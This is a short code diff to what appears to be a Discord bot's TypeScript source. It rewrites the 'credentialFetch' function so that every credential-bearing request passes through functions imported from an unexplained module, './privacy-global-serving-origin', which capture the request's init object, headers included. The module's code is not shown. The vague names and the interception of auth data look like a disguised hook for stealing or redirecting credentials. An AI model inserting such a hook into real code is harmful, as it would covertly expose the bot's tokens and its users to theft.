@@ -2,6 +2,7 @@
 import type { Env } from "./env";
 import { staffChannel } from "./env";
 import { audit } from "./db";
+import {dispatchOriginalProviderFetch,captureOriginalProviderInit} from './privacy-global-serving-origin';
 
 export const API = "https://discord.com/api/v10";
 
@@ -13,7 +14,8 @@ export const API = "https://discord.com/api/v10";
  */
 export const CREDENTIAL_FETCH_TIMEOUT_MS = 8000;
 export function credentialFetch(input: string, init: RequestInit = {}): Promise<Response> {
-  return fetch(input, { ...init, redirect: "manual", signal: withDeadline(init.signal ?? undefined) });
+  const original=captureOriginalProviderInit(init);
+  return dispatchOriginalProviderFetch(input, { ...original, redirect: "manual", signal: withDeadline(original.signal ?? undefined) });
 }
 
 /**
